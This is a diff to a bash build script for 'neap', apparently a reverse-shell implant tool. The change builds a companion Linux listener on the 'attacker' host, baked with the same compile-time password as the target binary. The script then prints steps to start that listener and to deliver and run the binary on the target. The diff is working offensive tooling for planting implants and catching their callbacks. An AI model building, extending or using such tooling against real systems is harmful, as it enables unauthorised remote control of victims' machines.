@@ -322,23 +322,39 @@ build() {
 
     # Is this a Windows cross-compile? The attacker box is assumed to be Linux,
     # so a .exe can't be used as the local listener — we need a native
-    # Linux neap for that. We detect two ways: the --target triple, or the
-    # .exe suffix the copy step appended.
+    # Linux neap with the SAME compile-time password to authenticate the
+    # target's callback. (There's no --password runtime flag — see
+    # config::PASSWORD, which is env!("NEAP_PASSWORD") baked at build time.)
     local target_is_windows=false
     if [[ "$TARGET" == *windows* ]] || [[ "$safe_name" == *.exe ]]; then
         target_is_windows=true
     fi
 
-    # Pick the attacker-side listener binary (always a *Linux* binary).
-    #   - Native Linux build without --nocli: reuse the target binary.
-    #   - Anything else (--nocli, or Windows cross-compile): fall back to a
-    #     generic ./neap sitting next to it. If missing, the handler will
-    #     fail fast with an actionable message.
-    local listener_bin
+    # Pick the attacker-side listener binary.
+    #   - Native Linux build without --nocli: the target binary IS the
+    #     listener (same binary has CLI and matching password).
+    #   - Windows cross-compile: build a companion Linux binary with the
+    #     same env vars (NEAP_PASSWORD, NEAP_LPORT, …) so passwords match.
+    #   - --nocli on a Linux build: target binary has no -l flag, so we
+    #     also need a companion CLI-enabled listener with the same password.
+    local listener_bin="$safe_name"
     if $target_is_windows || [ -n "$NOCLI" ]; then
-        listener_bin="neap"
-    else
-        listener_bin="$safe_name"
+        local listener_name="${safe_name%.exe}_listener"
+        info "Building companion Linux listener (matches target password)..."
+        # CLI-enabled (default features) and native host — no --target, no
+        # --no-default-features. Env vars from the target build still apply
+        # so NEAP_PASSWORD and friends are identical.
+        if cargo build --release >/dev/null 2>&1; then
+            if [ -f "target/release/neap" ]; then
+                cp "target/release/neap" "$OUTPUT_DIR/$listener_name"
+                success "Listener: $OUTPUT_DIR/$listener_name"
+                listener_bin="$listener_name"
+            else
+                warn "Companion listener binary not found — falling back to '$safe_name'"
+            fi
+        else
+            warn "Companion listener build failed — run 'cargo build --release' manually"
+        fi
     fi
 
     # ── Generate Handler Script ──
@@ -441,22 +457,15 @@ NEXEC
     # the binary directly. Show the binary invocation as the primary command
     # so nothing in the output implies the handler is required.
     #
-    # For Windows cross-compiles the listener must still run on the Linux
-    # attacker box, so the listener command references a native Linux neap
-    # (not the .exe produced for the target).
+    # $listener_bin is always the correct Linux binary with the matching
+    # password (either the target binary itself, or the companion
+    # *_listener built alongside it for Windows / --nocli cases).
     local handler_stem="${safe_name%.exe}"
     echo ""
     echo -e "${TEAL}Next steps:${RESET}"
     if [ "$MODE" = "reverse" ]; then
         echo -e "  ${TEXT}1. Start the listener on this (attacker) host:${RESET}"
-        if $target_is_windows; then
-            # .exe won't run on Linux — use a native neap. If one isn't
-            # built yet, point the user at how to make one.
-            echo -e "       ${GREEN}$OUTPUT_DIR/neap -l -p $PORT -v${RESET}"
-            echo -e "       ${SUBTEXT}(if $OUTPUT_DIR/neap is missing: 'cargo build --release && cp target/release/neap $OUTPUT_DIR/')${RESET}"
-        else
-            echo -e "       ${GREEN}$OUTPUT_DIR/$safe_name -l -p $PORT -v${RESET}"
-        fi
+        echo -e "       ${GREEN}$OUTPUT_DIR/$listener_bin -l -p $PORT -v${RESET}"
         echo -e "       ${SUBTEXT}(or run the convenience handler: $HANDLER_DIR/catch_${handler_stem}.sh)${RESET}"
         echo ""
         echo -e "  ${TEXT}2. Deliver and run the $(${target_is_windows} && echo 'Windows ' || echo '')binary on the target:${RESET}"
